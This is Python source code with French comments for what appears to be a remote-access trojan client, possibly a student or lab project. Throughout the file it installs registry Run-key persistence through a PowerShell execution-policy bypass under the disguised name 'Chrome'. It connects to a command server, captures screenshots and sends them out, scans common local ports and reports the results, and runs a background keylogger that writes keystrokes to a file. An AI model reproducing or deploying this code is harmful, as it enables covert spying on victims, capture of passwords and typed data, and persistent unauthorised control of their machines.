import socket as s
from subprocess import PIPE
from PIL import ImageGrab
import subprocess
import threading
from pynput import keyboard
import io

# Configuration de la persistance
app_name = "Chrome"
app_path = r"client.py"

powershell_script = f"""
$AppName = "{app_name}"
$AppPath = "{app_path}"

Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name $AppName -Value "powershell.exe -ExecutionPolicy Bypass -File $AppPath"
"""

try:
    subprocess.run(["powershell", "-Command", powershell_script], check=True)
except subprocess.CalledProcessError as e:
    pass
except Exception as e:
    pass

# Configuration du client
HOST_ADDR = '127.0.0.1'
HOST_PORT = 9999
TIMEOUT = 1024  # Timeout de 5 secondes

def connect_to_server():
    client_socket = s.socket(s.AF_INET, s.SOCK_STREAM)
    client_socket.settimeout(TIMEOUT)  # Définir le timeout pour les opérations de socket
    client_socket.connect((HOST_ADDR, HOST_PORT))

    try:
        while True:
            command = client_socket.recv(4096).decode()
            if command.lower() == 'exit':
                break
            elif command.lower() == 'screenshot':
                take_and_send_screenshot(client_socket)
            elif command.lower() == 'portscan':
                scan_ports_and_send_results(client_socket)
    except s.timeout:
        pass
    finally:
        client_socket.close()

def take_and_send_screenshot(client_socket):
    # Capture d'écran
    screen = ImageGrab.grab()
    
    # Convertir l'image en bytes (en PNG par exemple)
    img_byte_arr = io.BytesIO()
    screen.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    
    # Envoi de la capture d'écran au serveur
    client_socket.sendall(b"screenshot")  # Pour indiquer que la capture est en cours
    client_socket.sendall(len(img_byte_arr).to_bytes(4, 'big'))  # Envoi de la taille des données
    client_socket.sendall(img_byte_arr)  # Envoi des données de l'image

def scan_ports_and_send_results(client_socket):
    local_ip = s.gethostbyname(s.gethostname())
    open_ports = scan_known_ports(local_ip)
    
    # Envoi des résultats du scan de ports, chaque résultat séparé par un saut de ligne
    for result in open_ports:
        client_socket.send(result.encode() + b'\n')  # Ajout d'un saut de ligne entre chaque résultat
    
    # Terminer l'envoi avec un message "done"
    client_socket.send(b"done\n")  # Envoi du message "done" pour indiquer la fin de l'envoi

def scan_known_ports(host):
    ports = [22, 80, 443, 21, 23, 25, 53, 110, 143, 3306, 3389, 8080, 8888, 5900, 27017]
    open_ports = []

    for port in ports:  # Scanner les ports les plus connus
        result = scan_port(host, port)
        open_ports.append(result)
    
    return open_ports

def scan_port(host, port):
    try:
        # Création d'un socket
        with s.socket(s.AF_INET, s.SOCK_STREAM) as s_sock:
            s_sock.settimeout(0.01)  # Timeout de 10 ms
            result = s_sock.connect_ex((host, port))  # Tente de se connecter
            if result == 0:
                return f"Port {port} is open"
            else:
                return f"Port {port} is closed"
    except Exception as e:
        return f"Port {port} error: {e}"

def on_press(key):
    try:
        key_log = f'{key.char}'
    except AttributeError:
        key_log = f'{key}'

    with open("keylog.txt", "a") as log_file:
        log_file.write(key_log)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Lancer le keylogger dans un thread séparé
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

if __name__ == '__main__':
    connect_to_server()
